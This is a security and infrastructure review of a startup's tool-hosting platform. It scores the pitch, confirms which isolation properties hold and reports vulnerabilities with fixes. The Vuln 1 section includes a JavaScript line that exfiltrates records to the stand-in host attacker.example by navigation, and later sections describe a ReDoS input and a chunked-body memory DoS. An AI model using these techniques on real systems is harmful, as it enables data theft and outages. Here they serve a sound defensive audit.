# Hangar, YC W27, review by the security and infrastructure engineer

## Score

**PRIMARY: 6.8 / 10**

## Secondary odds

**~8%** if submitted today as-is: zero users, solo unknown founder, one falsifiable headline security claim, two real denial-of-service vectors, against the strongest-possible RFS fit and a genuinely working product.

## Verdict

This is a real product with above-average security engineering for a solo founder, built dead-on to Koomen's "A Cloud for Small Software" request, and most of the hard isolation claims hold up under active probing: session cookies are unreadable from tools, opaque-origin sandboxing is real, ticket kinds are cryptographically separated so none can be replayed as another, cross-team IDOR is blocked everywhere I tried it, path traversal in asset serving is blocked, deploy tokens are hashed and re-check live role on every call, and revocation is immediate. But the single most repeated security promise in the whole package, that a tool "cannot send data off Hangar," is false: a sandboxed tool reads all of a team's records through its own legitimate data ticket and exfiltrates them to any external server by top-level navigation (window.open, a target=_blank link, or location.href), none of which connect-src governs, and the e2e suite only tests fetch so it gives false confidence. Add an any-editor event-loop ReDoS in the secret scanner and an unbounded request body, and a technical partner or a pilot's security lead could break the core pitch in minutes. The idea and execution are interview-worthy; the falsifiable claim, the DoS bugs, and zero traction are what keep this a likely post-interview reject rather than a fight-for-it.

## What is strong

These I verified by active probing against the running server and by reading the code, not by trusting the docs.

- **Session isolation genuinely holds.** From inside a hosted tool: `document.cookie` throws, `parent.document` throws, `fetch("/t/acme-ops")` throws (opaque origin plus no CORS on Hangar pages), `window.origin === "null"`. The tool never carries the viewer's session, framed or opened directly at /run. The central "a tool cannot act as the viewer" property is real for identity and session.
- **Ticket design is correct.** `derivedKey("ticket:tool")` vs `ticket:asset` vs the raw session key means a tool token is not a login cookie and an asset ticket is not a tool token. I tried every substitution: tool token as asset path (404), asset ticket as API bearer (401), tool token as session cookie (not accepted at /teams). `timingSafeEqual` with length pre-check is used throughout (src/lib/tickets.ts:184, src/lib/session.ts:258).
- **Tenant isolation.** Cross-team deploy by appId is refused (src/lib/hosting/deploy.ts:107-113 and the tool-API record scoping by appId). A record id from another tool updated through this tool's token returns "No such record." Mallory, owner of a second team, gets 404 on Acme's /run and team pages.
- **Revocation is immediate and real**, because membership and live role are re-read on every ticket and every token use (src/lib/deploy-tokens.ts:39-47, src/lib/hosting/tool-api.ts:249-253, src/app/a/[ticket]/[...path]/route.ts:168-174).
- **Path traversal blocked.** `normaliseBundlePath` rejects .., leading /, backslash, null, and dotfiles; HTML is refused on the asset path so pages only serve through /run.
- **XSS is handled.** A tool name of `Evil</script><script>...` is emitted as `</script>` by `scriptSafeJson` (src/lib/hosting/runtime.ts:59-66); it does not break out, and the page is sandboxed anyway.
- **CSRF from a tool is blocked twice:** the opaque origin sends Origin: null and no cookies, and Next 16.3.5 rejects server actions whose Origin does not match host (node_modules/next/dist/server/app-render/action-handler.js:445-460).
- **Honesty in the README "Known gaps" section** (no rate limiting, no record-level perms, sessions not revocable, files in Postgres). That candor is a genuine plus for a YC reviewer.
- Clean: 48 unit tests pass, `tsc --noEmit` passes.

## Vulnerabilities and bugs found

### 1. A tool can exfiltrate all data it can read, by navigation. HIGH
**Files:** src/lib/hosting/runtime.ts:20-26 (`TOOL_SANDBOX` includes `allow-popups`) and src/lib/hosting/runtime.ts:28-43 (`TOOL_CSP` has `connect-src 'self'` but no control over navigation).

**Why it matters:** this falsifies the product's most repeated claim and the exact thing an IT buyer relies on to host untrusted, agent-written tools.

**Reproduction (verified in Chromium against the live server, as a VIEWER):** inside a hosted tool,
```js
const recs = await window.hangar.collection("requests").list();   // the tool's own legitimate ticket
window.location.href = "https://attacker.example/leak?d=" + encodeURIComponent(JSON.stringify(recs));
```
The outbound request to attacker.example fires with the records in the query string. `window.open("https://attacker.example/?d=...")` and a `<a target="_blank" href="https://attacker.example/?d=...">` click both work too. For contrast, `fetch`, XHR and `navigator.sendBeacon` to the same host are correctly blocked by `connect-src 'self'`. The e2e suite only exercises `fetch(external)`, which is why this passed unnoticed. The session is NOT stolen (opaque origin holds), but any data the tool can read, which is every record in every collection of that tool (up to 500 per list call), leaves Hangar.

**Fix:** remove `allow-popups` from `TOOL_SANDBOX` (closes window.open and target=_blank). Self-navigation via `location.href` cannot be stopped by sandbox tokens, and CSP `navigate-to` is no longer supported in Chromium, so the honest remedy has two parts: (a) correct the docs to claim only what holds (no session theft, no fetch/XHR/beacon egress), and (b) for data confidentiality, move sensitive data behind a server-side broker or per-record scoping so a tool never holds the full dataset it could navigate out. At minimum, stop telling buyers "a tool cannot send data off Hangar."

### 2. Event-loop ReDoS in the secret scanner, triggerable by any editor. HIGH
**File:** src/lib/hosting/secrets.ts:446 (Supabase rule `/\beyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g`), run synchronously in `scanText` (src/lib/hosting/secrets.ts:462-478) on the request thread.

**Reproduction (verified end to end through POST /api/v1/deploy):** deploy an index.html whose body is `"eyJ-"` repeated. Measured wall time of the deploy response: 400 KB took 44.6 s, 800 KB took 177.9 s. The scaling is quadratic, so a 2 MB file (allowed under the 2 MB per-file cap) blocks the single-threaded Node event loop for roughly 15 to 20 minutes, during which every tenant's request is stalled. There is no rate limiting (acknowledged in the README), so this is repeatable at will by the lowest deploy-capable role.

**Fix:** cap per-file scan length (for example 256 KB), or pre-filter so the JWT regex only runs on substrings that actually contain two dots within a bounded window, or replace the greedy `+` quantifiers with bounded ones and anchor the structure, or run scanning in a worker with a timeout. Any one of these converts it to linear.

### 3. Deploy body size cap is advisory and bypassable, enabling a memory DoS. MEDIUM
**File:** src/app/api/v1/deploy/route.ts:165-168 (checks only the client-supplied `content-length` header before `request.json()`).

**Reproduction (verified):** POST with `Transfer-Encoding: chunked` and no `content-length`. A 60 MB body was fully buffered and JSON-parsed by the handler (it reached the "A new tool needs a name" validation), so `MAX_BODY_BYTES` never applied. Combined with no rate limiting, a token holder can exhaust server memory.

**Fix:** enforce a hard byte ceiling while reading the body (a size-limited stream reader) rather than trusting the header; reject once the ceiling is passed, before parsing.

### 4. Roles are cosmetic for tool data; approvals are not enforceable. MEDIUM
**Files:** src/app/api/tool/v1/records/[collection]/route.ts and .../[collection]/[id]/route.ts authorize writes on `app:run` only, which every member including VIEWER holds.

**Reproduction (verified):** a VIEWER tool token issued a PUT that overwrote an already-"approved" purchase request, setting `amount` to 99999 and `approvedBy` to the viewer. The UI hides the approve button for viewers, but that is cosmetic; the data API lets any member who can open a tool read, modify and delete all of its records. This is partially disclosed in the README "Known gaps," but the memo sells "a full approvals tool needs zero backend code," which overstates what the model can enforce.

**Fix:** add a write/delete capability distinct from `app:run`, or support record ownership and field immutability, or stop positioning role-gated and approval tools until record-level permissions exist.

### 5. Secret scanner is a blocklist, not "by construction." LOW to MEDIUM
**File:** src/lib/hosting/secrets.ts:427-450. The rules catch common provider key shapes but miss generic high-entropy secrets, Google OAuth client secrets, Azure keys, non-Supabase JWTs, and any novel format. The Supabase check trusts an unverified JWT payload's `role` field. A hardcoded credential in an unrecognized format ships. This is fine as defense in depth, but it is the same "scan code forever" treadmill the memo criticizes competitors for, so the "removes it by construction" framing is wrong (see Overclaims).

### Notes (not scored as vulns)
- The "Free: 3 tools, 10 members" plan limits are not enforced anywhere in code; deploys and memberships are unbounded. Billing gap, not security.
- Asset files are served with `Access-Control-Allow-Origin: *`. Safe here because the ticket in the path is an unguessable HMAC and `Cache-Control: private` prevents shared caching, but worth a comment.

## Overclaims in the docs

- **Memo section 4:** "cannot send data off Hangar." **README security model:** "No way out. connect-src 'self' and friends keep a tool's network traffic on Hangar. A tool cannot post what it shows to somewhere else." **HostedRunner UI badge:** "This tool cannot see your Hangar session or send data outside Hangar." All false for navigation-based egress (Vuln 1). True only for fetch/XHR/beacon.
- **Memo section 3:** "Most vibe-code breaches are architecture failures... Code review and scanners chase that problem forever. Hangar removes it by construction." The part that is "by construction" is only that Hangar hands tools no platform credentials. Stopping a developer from hardcoding their own secret is done by a regex blocklist (Vuln 5), which is a scanner.
- **Memo section 4:** "A full approvals tool needs zero backend code (see examples/purchase-requests, 80 lines)." The approval cannot be enforced; any viewer can approve via the API (Vuln 4).
- **Memo risks table:** "The model is tested end to end in a real browser, including CSRF-style attacks." True, but the exfiltration test is fetch-only, so the suite certifies a property that does not hold. That is the more concerning calibration issue.
- Minor, flagged for submission day as the README already advises: "Vercel lists SAML SSO at $300/month" and the Claude Code and Lovable revenue figures should be re-clicked before submitting.

## Top changes ranked by score impact

1. **Close the navigation exfil channel and re-scope the claim (+0.6).** Remove `allow-popups`, and rewrite every "cannot send data off Hangar" line to state exactly what holds: no session theft, no fetch/XHR/beacon egress, and treat tool-readable data as data a determined tool can still navigate out. This removes the one thing a technical partner breaks live.
2. **Land 3 to 5 real pilots with the weekly shared-tool number before Oct 30 (+0.7).** Traction is the biggest single lever at YC and the plan is credible; honest small numbers beat a zero.
3. **Fix the ReDoS, add a hard body cap, add basic rate limiting on the deploy and data APIs (+0.4).** Removes a DoS any editor can trigger and strengthens the "minimal surface" risk answer.
4. **Make roles real for tool data or drop the approvals positioning (+0.3).** Add a write capability or record ownership, or stop selling enforceable approvals until record-level perms exist.
5. **Publish a short, honest threat-model page (+0.2).** State what the sandbox does and does not prevent. For a security-positioned company, disclosing the navigation limit turns a weakness into a credibility signal for IT buyers.
6. **Soften "by construction" to "no platform credentials in tools, plus a best-effort scanner" (+0.1).** Small honesty fix that removes an easy partner counter.
7. **Fill the founder story credibly (+0.3, excluded from scoring but it moves partners).** The "why you" and the hacked-a-system answer are what carry a solo application.

## What would make this a 9.5+

- A design that provably prevents data exfiltration, not just session theft: a credential and data broker where the tool renders data it was granted but never holds the raw dataset it could navigate out, or server-enforced per-tool egress and per-record scoping. If a tool cannot leak what it was shown, the "safe to hand every agent" claim becomes true rather than aspirational.
- The DoS and body-cap issues fixed, rate limiting in place, and an outside adversarial pentest that the security claims survive unchanged.
- 10 or more active pilots with the shared-tool metric trending up week over week, and a first paid conversion.
- Connectors shipped with real credential brokering, plus SSO and audit export, so the "control plane" moat is something you can demo rather than describe.
- A cofounder who has run production multi-tenant infrastructure, which would also answer the "can a solo founder hold this security surface" question a partner will have.
